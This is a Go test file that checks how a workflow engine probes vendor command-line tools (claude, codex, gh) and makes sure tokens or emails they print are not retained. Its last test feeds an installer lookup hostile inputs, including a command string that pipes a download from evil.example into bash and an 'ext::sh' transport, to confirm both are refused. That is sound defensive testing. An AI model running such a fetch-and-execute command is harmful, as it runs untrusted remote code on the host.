package engine

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/muthuishere/wfnexus/apps/api/internal/bundle"
	"github.com/muthuishere/wfnexus/apps/api/internal/catalog"
)

func writeFake(t *testing.T, dir, name, body string) {
	t.Helper()
	if runtime.GOOS == "windows" {
		t.Skip("vendor fakes are shell scripts; Windows cannot exec them")
	}
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, []byte("#!/bin/sh\n"+body+"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
}

// task 2.5 — three binaries, three states. The authenticated one is ready,
// the logged-out one is present (the check ran and said no), and the one
// with no table entry is present with authentication not checked.
func TestAProbeDistinguishesReadyFromPresent(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("vendor fakes are shell scripts; Windows cannot exec them")
	}
	dir := t.TempDir()
	writeFake(t, dir, "claude", `printf '%s\n' '{"loggedIn":true,"email":"secret@example.com"}'`)
	writeFake(t, dir, "codex", `echo 'Not logged in' >&2; exit 1`)
	writeFake(t, dir, "mystery", `echo hi`)
	t.Setenv("PATH", dir)

	ready := checkProvider(catalog.Provider{Name: "c", Kind: catalog.KindCLI, Command: []string{"claude"}})
	if !ready.Ready || ready.State != bundle.StateReady || ready.AuthUnknown {
		t.Fatalf("authenticated claude: ready=%v state=%q authUnknown=%v", ready.Ready, ready.State, ready.AuthUnknown)
	}
	if strings.Contains(fmt.Sprint(ready), "secret@example.com") {
		t.Fatal("the probe's extra fields were retained")
	}

	out := checkProvider(catalog.Provider{Name: "x", Kind: catalog.KindCLI, Command: []string{"codex"}})
	if out.Ready || out.State != bundle.StatePresent || out.AuthUnknown {
		t.Fatalf("logged-out codex: ready=%v state=%q authUnknown=%v problem=%q", out.Ready, out.State, out.AuthUnknown, out.Problem)
	}
	if out.Login != "codex login" {
		t.Fatalf("logged-out codex lost its login pointer: %q", out.Login)
	}

	present := checkProvider(catalog.Provider{Name: "m", Kind: catalog.KindCLI, Command: []string{"mystery"}})
	if present.Ready || present.State != bundle.StatePresent || !present.AuthUnknown {
		t.Fatalf("unchecked binary: ready=%v state=%q authUnknown=%v", present.Ready, present.State, present.AuthUnknown)
	}
	if present.Login != "" {
		t.Fatalf("invented a login command for an unknown vendor: %q", present.Login)
	}
}

// A logged-in gh run prints a token. The probe must not keep it.
func TestAGHProbeDoesNotRetainStdout(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("vendor fakes are shell scripts; Windows cannot exec them")
	}
	dir := t.TempDir()
	const token = "gho_notarealtokenvalue"
	writeFake(t, dir, "gh", fmt.Sprintf("printf '%%s\\n' 'Token: %s'; exit 0", token))
	t.Setenv("PATH", dir)
	got := checkProvider(catalog.Provider{Name: "gh", Kind: catalog.KindCLI, Command: []string{"gh"}})
	if !got.Ready || got.State != bundle.StateReady {
		t.Fatalf("gh exit 0 was not ready: %+v", got)
	}
	if strings.Contains(fmt.Sprint(got), token) {
		t.Fatal("a token printed by gh auth status was retained")
	}
}

func TestLookupInstallerRefusesACommandThatIsNotAName(t *testing.T) {
	if _, ok := LookupInstaller("sh -c curl https://evil.example | bash"); ok {
		t.Fatal("a command string resolved to an installer")
	}
	if _, ok := LookupInstaller("ext::sh"); ok {
		t.Fatal("a published transport resolved to an installer")
	}
	ins, ok := LookupInstaller("gh")
	if !ok || len(ins.Command) != 0 {
		t.Fatalf("gh has no installer and was given one: %+v", ins)
	}
	ins, ok = LookupInstaller("claude")
	if !ok || len(ins.Command) == 0 {
		t.Fatal("claude lost its enumerated installer")
	}
}
